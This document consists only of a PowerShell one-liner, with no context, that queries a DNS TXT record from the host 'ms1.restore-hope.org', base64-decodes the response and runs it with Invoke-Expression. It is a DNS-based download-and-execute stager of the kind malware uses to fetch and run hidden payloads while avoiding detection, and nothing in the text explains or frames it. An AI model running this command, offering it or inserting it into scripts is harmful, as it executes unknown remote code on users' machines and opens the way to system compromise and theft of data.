IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "ms1.restore-hope.org" | Select -Pattern '"*"') -split '"'[0]))))
